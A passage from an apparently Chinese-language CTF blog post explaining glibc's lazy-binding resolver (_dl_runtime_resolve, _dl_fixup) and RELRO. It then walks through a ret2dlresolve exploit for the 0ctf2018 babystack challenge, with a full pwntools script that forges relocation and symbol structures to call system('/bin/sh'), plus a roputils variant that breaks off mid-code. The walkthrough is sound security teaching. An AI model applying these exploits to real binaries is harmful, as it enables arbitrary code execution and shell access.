class="keyword">const</span> rel_addr = (<span class="keyword">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line">    <span class="comment">//这里通过r_offset获取了got表地址（不是重点内容）</span></span><br><span class="line">  <span class="keyword">lookup_t</span> result;</span><br><span class="line">  DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>= (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">          ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">          version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">          <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">            version = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">                    version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line">      <span class="comment">//3.接着通过strtab + sym-&gt;st_name找到符号表字符串，result为libc基地址</span></span><br><span class="line"></span><br><span class="line">      value = sym ? (LOOKUP_VALUE_ADDRESS (result)</span><br><span class="line">                      + sym-&gt;st_value) : <span class="number">0</span>;</span><br><span class="line">      <span class="comment">//4.value为libc基址加上要解析函数的偏移地址(st_value)，也即实际地址</span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      value = l-&gt;l_addr + sym-&gt;st_value;</span><br><span class="line">      result = l;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);</span><br><span class="line">    <span class="comment">//5.最后把value写入相应的GOT表条目中，并执行（不是重点内容）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>简单来说：</p>
<p>1.dl_fixup会根据参数link_map可以找到.dynamic的地址</p>
<p>2.根据.dynamic的地址分别找到.rel.plt，dynsym，dynstr的地址</p>
<p>3.通过“_dl_lookup_symbol_x”计算出libc基地址，计算得目标在libc中的真实地址</p>
<p>4.最后写入got表</p>
<p>参考：</p>
<p>AT&amp;T汇编：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/0480e431f1d7">https://www.jianshu.com/p/0480e431f1d7</a></p>
<p>Link Map：<a target="_blank" rel="noopener" href="https://www.shuzhiduo.com/A/Ae5RgZDrdQ/">https://www.shuzhiduo.com/A/Ae5RgZDrdQ/</a></p>
<p>重定位入口：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/fr-ruiyang/p/10457817.html">https://www.cnblogs.com/fr-ruiyang/p/10457817.html</a></p>
<hr>
<h2 id="数据索引流程"><a href="#数据索引流程" class="headerlink" title="数据索引流程"></a>数据索引流程</h2><p>不管是在dl_runtime_resolve中，还是在_dl_fixup中，都有许多<strong>“数据识别”</strong>的操作</p>
<p>函数_dl_runtime_resolve执行时，它需要知道搜索哪一个函数，获取对应的 <strong>符号</strong> ，<strong>真实地址</strong> 等信息，这些都需要进行<strong>“数据识别”</strong>，那么对于每一个函数，必须有可以<strong>唯一确定</strong>它的身份的标识信息，同样，在“jmprel，symtab，strtab”中也必须有对应的标识信息来索引正确的数据</p>
<p>这个 <strong>“标识信息”</strong> 就是各个表中，各个元素的<strong>下标</strong></p>
<p>然后我们就通过分析dl_runtime_resolve的执行过程来了解<strong>下标</strong>的作用：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *<span class="keyword">const</span> symtab </span>= (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *strtab = (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line"><span class="comment">//‘symtab’和‘strtab’分别为symtab和strtab的基地址</span></span><br><span class="line"><span class="comment">//D_PTR (l, l_info[DT_XXXX]：用于获取&#x27;symtab&#x27;,&#x27;strtab&#x27;,&#x27;jmprel&#x27;的首地址</span></span><br></pre></td></tr></table></figure>
<p>1.dl_runtime_resolve在搜索某个函数时，首先需要获取<strong>它在jmprel中的位置</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) +</span><br><span class="line">reloc_offset);						</span><br><span class="line"><span class="comment">//首先获取&#x27;jmprel&#x27;，然后加上&#x27;reloc_offset&#x27;就是目标函数在jmprel中的地址了 </span></span><br></pre></td></tr></table></figure>
<p>这里的“reloc_offset”就是<strong>目标函数在jmprel中的下标</strong>，同时也是“reloc_arg”</p>
<p>“reloc_offset” + “jmprel” = “目标函数在jmprel中对应的位置”，保存于指针reloc中，指向对应结构体Elf_Rel</p>
<p>2.通过结构体Elf_Rel中的信息，获取<strong>dynsym中目标符号的位置</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Addr  r_offset;	<span class="comment">// 重定位入口的偏移（可以定位got表地址）</span></span><br><span class="line">    Elf32_Word  r_info; 	<span class="comment">// 重定位入口的类型（低8位）</span></span><br><span class="line">    <span class="comment">// 符号在符号表中的下标（高24位）</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line"><span class="comment">//reloc-&gt;r_info：存储有‘目标符号在符号表中的下标’</span></span><br><span class="line"><span class="comment">//相当于*sym = symtab[index],直接获取了目标符号的Elf_Sym结构体</span></span><br></pre></td></tr></table></figure>
<p>计算“r_info &gt;&gt; 8”得到<strong>目标函数在symtab中的下标</strong>（index）</p>
<p>“symtab[index]” = “目标符号在symtab中对应的位置”，保存于指针sym中，指向对应结构体Elf_Sym</p>
<p>3.通过结构体Elf_Sym中的信息，获取<strong>关键信息</strong>，并计算出 <strong>libc基地址</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    st_name; <span class="comment">//表示该成员在字符串表中的下标</span></span><br><span class="line">  Elf32_Addr    st_value; <span class="comment">//将要解析的函数在libc中的偏移地址</span></span><br><span class="line">  Elf32_Word    st_size; <span class="comment">//符号长度</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;</span><br><span class="line">  Elf32_Section st_shndx;</span><br><span class="line">&#125;Elf32_Sym;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//sym-&gt;st_name：存储有‘该字符串在字符串表中的下标’</span></span><br><span class="line"><span class="comment">//_dl_lookup_symbol_x根据多种信息得出libc基地址，保存于result中</span></span><br></pre></td></tr></table></figure>
<p>这里的“st_name”就是<strong>目标字符串在strtab中的下标</strong></p>
<p>“st_name” + “strtab” = “对应的字符串”，传入_dl_lookup_symbol_x，而这个函数可以根据：link_map，sym(指向结构体Elf_Sym)，version(版本信息)，flags(标志)等各个信息综合分析，最终获取libc的基地址，保存于指针result中</p>
<p>4.根据libc基地址获取目标函数的<strong>真实地址</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">value = sym ? (LOOKUP_VALUE_ADDRESS (result)+ sym-&gt;st_value) : <span class="number">0</span>;</span><br><span class="line"><span class="comment">//sym-&gt;st_value：存储有将要解析函数的偏移地址（和‘下标’不同）</span></span><br></pre></td></tr></table></figure>
<p>“result” + “st_value” = “目标函数在libc中的真实地址”，存储于value中</p>
<p>5.图表如下：</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">     _dl_runtime_resolve(link_map, reloc_arg)</span><br><span class="line">                                       +</span><br><span class="line">          +-----------+                | <span class="comment">#jmprel[0]+reloc_arg</span></span><br><span class="line">          | Elf32_Rel | &lt;--------------+ 	</span><br><span class="line">          +-----------+		</span><br><span class="line">     +--+ | r_offset  |        +-----------+</span><br><span class="line">     |    |  r_info   | +----&gt; | Elf32_Sym |	 <span class="comment">#libc_base+st_value</span></span><br><span class="line">     |    +-----------+        +-----------+      +----------+</span><br><span class="line">     |      .rel.plt           |  st_name  | +--&gt; |<span class="string">&#x27;system\0&#x27;</span>|</span><br><span class="line">     |                         |           |      +----------+</span><br><span class="line">     v                         +-----------+        .dynstr</span><br><span class="line">+----+-----+                      .dynsym</span><br><span class="line">| &lt;system&gt; | 				<span class="comment">#symtab[index]</span></span><br><span class="line">+----------+</span><br><span class="line">  .got.plt</span><br></pre></td></tr></table></figure>
<p>总而言之：</p>
<p>传入参数reloc_arg就是<strong>重定位表</strong>的下标</p>
<p>“Elf32_Rel -&gt; r_info” 的高24字节就是<strong>字符表</strong>的下标</p>
<p>“Elf32_Sym -&gt; st_name” 就是<strong>字符串表</strong>的下标</p>
<p>​        //在上一个表中，存储有下一个表的下标</p>
<hr>
<h2 id="RELRO保护机制"><a href="#RELRO保护机制" class="headerlink" title="RELRO保护机制"></a>RELRO保护机制</h2><p>系统保护机制 <strong>RELRO</strong>（Relocation Read-Only，重定位只读）</p>
<p><strong>RELRO</strong>有3种形式：</p>
<p>1.No RELRO：</p>
<p>没有RELRO，<code>.dynamic</code>段可写，所以我们可以任意修改GOT表/plt表</p>
<p>2.Partial RELRO：</p>
<p>部分RELRO，<code>.dynamic</code>段不可写，不能修改plt表但是可以修改GOT表， 该ELF文件的各个部分被重新排序</p>
<p>3.FULL RELRO：</p>
<p>完全开启RELRO，启后 <strong>立即绑定</strong> 函数地址，<code>.got</code>段只读不可写，该ELF文件的各个部分被重新排序</p>
<p><strong>FULL RELRO</strong> 可以限制 <strong>ret2dlresolve</strong> ，但是 <strong>Partial RELRO</strong> 是没有影响的</p>
<hr>
<h2 id="深入理解ret2dlresolve"><a href="#深入理解ret2dlresolve" class="headerlink" title="深入理解ret2dlresolve"></a>深入理解ret2dlresolve</h2><p>ret2dlresolve通常有3种思路：</p>
<p>思路 1 - 控制dynamic（直接修改got表）</p>
<p>思路 2 - 控制重定位表项的相关内容</p>
<p>思路 3 - 伪造 link_map</p>
<img src="/2021/12/23/dl-runtime-resolve%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1640195986238-1640267844290.png" class width="1640195986238"> 
<p>这里我们重点分析“思路 3”：</p>
<p>函数_dl_runtime_resolve( link_map，reloc_arg )有一个漏洞：</p>
<img src="/2021/12/23/dl-runtime-resolve%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1641226472639.png" class width="1641226472639"> 
<img src="/2021/12/23/dl-runtime-resolve%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1641179255771.png" class width="1641179255771"> 
<p>​        //如果是32位系统，字长就变为4</p>
<p>它的参数都是直接从栈上取的，这样我们伪造栈，就可以伪造参数了</p>
<p>​        //栈顶为link_map，下一个栈空间就是reloc_arg</p>
<p>为了实现这一点，必须先进行栈转移来实现<strong>“完全控制”</strong>（输入值可以控制栈顶）</p>
<p>这里我们用经典题目 <strong>0ctf2018 babystack</strong>(32位)来介绍 <strong>ret2dlresolve</strong> 的过程：</p>
<p>此题的源文件很简单，就一个read函数，没有任何东西</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  alarm(<span class="number">0xA</span>);</span><br><span class="line">  myread();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">myread</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">40</span>];</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x40</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先看常规攻击的exploit：（思路 3 - 伪造 link_map）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./ret2dlresolve&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ret2dlresolve&quot;</span>)</span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x0804a000</span></span><br><span class="line">bss_stage = bss_addr + <span class="number">0x800</span></span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[<span class="string">&quot;read&quot;</span>]</span><br><span class="line"></span><br><span class="line">pop_ebp_ret = <span class="number">0x080484eb</span></span><br><span class="line">leave_ret = <span class="number">0x080483a8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#伪造read(0,bss_stage,100)，同时完成栈转移bss_stage</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>					</span><br><span class="line">payload += p32(bss_stage)			</span><br><span class="line">payload += p32(read_plt)      		</span><br><span class="line">payload += p32(leave_ret)<span class="comment">#read执行完成后，执行leave_ret			</span></span><br><span class="line">payload += p32(<span class="number">0</span>)					</span><br><span class="line">payload += p32(bss_stage)			</span><br><span class="line">payload += p32(<span class="number">100</span>)	</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dynsym = <span class="number">0x080481cc</span></span><br><span class="line">dynstr = <span class="number">0x0804822c</span></span><br><span class="line">plt_0 = <span class="number">0x080482f0</span>	<span class="comment">#plt[0]的第一个地址</span></span><br><span class="line">rel_plt = <span class="number">0x080482b0</span>	<span class="comment">#重定位表的起始地址</span></span><br><span class="line"><span class="comment">#伪造‘重定位表的下标’(.rel.plt)</span></span><br><span class="line">index_offset = (bss_stage + <span class="number">28</span>) - rel_plt <span class="comment">#index_offset =&gt; bss_stage+28</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_sym_addr = bss_stage + <span class="number">36</span> <span class="comment">#伪造Elf_sym的地址：bss_stage+36</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)	<span class="comment">#对齐到0x10字节</span></span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line"><span class="comment">#伪造‘符号表的下标’(.dynsym)</span></span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / <span class="number">0x10</span> <span class="comment">#index_dynsym =&gt; bss_stage+36</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_str_addr = fake_sym_addr + <span class="number">0x10</span> <span class="comment">#伪造str的地址：bss_stage+36+16</span></span><br><span class="line"><span class="comment">#伪造‘字符串表的下标’(.dynstr)</span></span><br><span class="line">st_name = fake_str_addr - dynstr <span class="comment">#st_name =&gt; bss_stage+36+16</span></span><br><span class="line"><span class="comment">#伪造Elf_sym结构体</span></span><br><span class="line">fake_sym = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>) <span class="comment">#长16字节</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">alarm_got = elf.got[<span class="string">&quot;alarm&quot;</span>]</span><br><span class="line"><span class="comment">#利用index_dynsym，逆向运算伪造r_info</span></span><br><span class="line">r_info = (index_dynsym &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span> <span class="comment">#左移8位，末尾3位全变为1</span></span><br><span class="line"><span class="comment">#伪造Elf_Rel结构体</span></span><br><span class="line">fake_reloc = p32(alarm_got) + p32(r_info)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#payload构造</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x4</span>				<span class="comment">#位于bss_stage+0</span></span><br><span class="line">payload += p32(plt_0) 						</span><br><span class="line">payload += p32(index_offset) <span class="comment">#index_offset -&gt; bss_stage+28 -&gt; fake_reloc</span></span><br><span class="line">payload += <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">payload += p32(bss_stage+<span class="number">80</span>) <span class="comment">#bss_stage+80 -&gt; /bin/sh</span></span><br><span class="line">payload += <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">payload += fake_reloc	 			<span class="comment">#位于bss_stage+28</span></span><br><span class="line">payload += <span class="string">&#x27;a&#x27;</span>*align </span><br><span class="line">payload += fake_sym 	 			<span class="comment">#位于bss_stage+36(长16字节)</span></span><br><span class="line">payload += <span class="string">&quot;system\x00&quot;</span> <span class="comment">#伪造函数字符串	    #位于bss_stage+36+16</span></span><br><span class="line">payload = payload.ljust(<span class="number">80</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment">#补齐80字节</span></span><br><span class="line">payload += <span class="string">&quot;/bin/sh\x00&quot;</span> <span class="comment">#伪造参数字符串	    #位于bss_stage+80</span></span><br><span class="line">payload = payload.ljust(<span class="number">100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>根据 <strong>延迟绑定</strong> 机制，程序第一次调用某个函数时会调用函数 <strong>_dl_runtime_resolve</strong> 来获取它的真实地址，<strong>ret2dlresolve</strong> 也是在这一步动手脚，通过控制栈中的数据来伪造 <strong>_dl_runtime_resolve</strong> 的参数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x4</span>					</span><br><span class="line">payload += p32(plt_0)			<span class="comment">#伪造link_map				</span></span><br><span class="line">payload += p32(index_offset)	<span class="comment">#伪造reloc_arg </span></span><br></pre></td></tr></table></figure>
<p>ret2dlresolve根据参数reloc_arg可以获取“Elf_Rel”，“Elf_Sym”，“str”等数据的地址</p>
<p>而我们通过栈转移把使<strong>SS:SP</strong>指向fake_stack，然后伪造“Elf_Rel”，“Elf_Sym”，“str”，最后伪造函数reloc_arg来误导程序把“aaaa”重定位成“system(‘/bin/sh’)”</p>
<p>​        //为什么这里是“aaaa”，在最后说明</p>
<p>先看正常的调用栈：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>| <span class="number">0xffffcf24</span> --&gt; <span class="number">0xf7ffd990</span> --&gt; <span class="number">0x0</span>   	 <span class="comment">//link_map</span></span><br><span class="line"><span class="number">0004</span>| <span class="number">0xffffcf28</span> --&gt; <span class="number">0x8</span> 			 <span class="comment">//reloc_arg</span></span><br><span class="line"><span class="number">0008</span>| <span class="number">0xffffcf2c</span> --&gt; <span class="number">0x0</span> <span class="comment">//返回地址</span></span><br><span class="line"><span class="number">0012</span>| <span class="number">0xffffcf30</span> --&gt; <span class="number">0x0</span> <span class="comment">//参数</span></span><br></pre></td></tr></table></figure>
<p>再看伪造后的调用栈：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>| bss_stage+<span class="number">4</span>  --&gt; plt_0 --&gt; <span class="number">0x0</span>   	 </span><br><span class="line"><span class="number">0004</span>| bss_stage+<span class="number">8</span>  --&gt; index_offset		</span><br><span class="line"><span class="number">0008</span>| bss_stage+<span class="number">12</span>  --&gt; <span class="string">&#x27;aaaa&#x27;</span> 			</span><br><span class="line"><span class="number">0012</span>| bss_stage+<span class="number">16</span> --&gt; bss_stage+<span class="number">80</span>	--&gt; <span class="string">&quot;/bin/sh\x00&quot;</span>	</span><br></pre></td></tr></table></figure>
<p>伪造reloc_arg为index_offset，欺骗程序把“bss_stage+28”处的内容识别为<strong>Elf_rel</strong></p>
<p>伪造Elf_rel中的r_info，欺骗程序把“bss_stage+36”处的内容识别为<strong>Elf_sym</strong></p>
<p>伪造Elf_sym中的st_name，欺骗程序把“bss_stage+52”处的内容识别为<strong>str</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>| bss_stage+<span class="number">20</span> --&gt; <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line"><span class="number">0000</span>| bss_stage+<span class="number">24</span> --&gt; <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line"><span class="number">0000</span>| bss_stage+<span class="number">28</span> --&gt; fake_reloc-&gt;alarm_got(r_offset)<span class="comment">//伪造Elf_rel</span></span><br><span class="line"><span class="number">0000</span>| bss_stage+<span class="number">32</span> --&gt; fake_reloc-&gt;r_info(r_info)</span><br><span class="line"><span class="number">0000</span>| bss_stage+<span class="number">36</span> --&gt; fake_sym-&gt;st_name(st_name)<span class="comment">//伪造Elf_sym</span></span><br><span class="line"><span class="number">0000</span>| bss_stage+<span class="number">40</span> --&gt; fake_sym-&gt;st_value(<span class="number">0</span>)</span><br><span class="line"><span class="number">0000</span>| bss_stage+<span class="number">44</span> --&gt; fake_sym-&gt;st_size(<span class="number">0</span>)</span><br><span class="line"><span class="number">0000</span>| bss_stage+<span class="number">48</span> --&gt; fake_sym-&gt;st_shndx(<span class="number">0x12</span>)</span><br><span class="line"><span class="number">0000</span>| bss_stage+<span class="number">52</span> --&gt; <span class="string">&quot;system\x00&quot;</span><span class="comment">//伪造str</span></span><br><span class="line"><span class="number">0000</span>| bss_stage+<span class="number">56</span> --&gt; ........  </span><br><span class="line"><span class="number">0000</span>| bss_stage+<span class="number">80</span> --&gt; <span class="string">&quot;/bin/sh\x00&quot;</span>  </span><br></pre></td></tr></table></figure>
<p>一连串的伪造，最终欺骗程序把“aaaa”重定位为“system”，又因为dl_runtime_resolve会在重定位完成以后<strong>重新执行</strong>函数，所以可以获取shell</p>
<p><strong>ret2dlresolve</strong>的利用过程很复杂，需要伪造相关的数据结构，但又比较固定，所以有许多工具来帮助我们实现<strong>ret2dlresolve</strong>，避免繁杂重复的过程</p>
<p>1.Pwntools中有专门针对<strong>ret2dlresolve</strong>的模块 &gt;&gt; <strong>Ret2dlresolvePayload</strong></p>
<p>2.roputils就是为<strong>ret2dlresolve</strong>而生的 </p>
<p>利用工具攻击的exploit：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> roputils</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">offset = <span class="number">44</span></span><br><span class="line">readplt = <span class="number">0x08048300</span></span><br><span class="line">bss = <span class="number">0x0804a020</span></span><br><span class="line">vulFunc = <span class="number">0x0804843B</span> <span class="comment"># Attackeds function</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ret2dlresolve&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rop = roputils.ROP(<span class="string">&#x27;./ret2dlresolve&#x27;</span>)<span class="comment"># ROP module + roputils module</span></span><br><span class="line">addr_bss = rop.section(<span class="string">&#x27;.bss&#x27;</span>)</span><br><span class="line"></span><br><span class="line">buf1 = <span class="string">&#x27;A&#x27;</span> * offset </span><br><span class="line">buf1 += p32(readplt) + p32(vulFunc) + p32(<span class="number">0</span>) + p32(addr_bss) + p32(<span class="number">100</span>)</span><br><span class="line"><span class="comment"># fake：read(0,addr_bss,100)</span></span><br><span class="line">p.send(buf1)</span><br><span class="line">					 <span class="comment">#套路固定</span></span><br><span class="line"><span class="comment">#----------------------------------------------------------------#</span></span><br><span class="line">buf2 =  rop.string(<span class="string">&#x27;/bin/sh&#x27;</span>) <span class="comment">#addr_bss+0 -&gt; &#x27;/bin/sh&#x27;</span></span><br><span class="line">buf2 += rop.fill(<span class="number">20</span>, buf2)</span><br><span 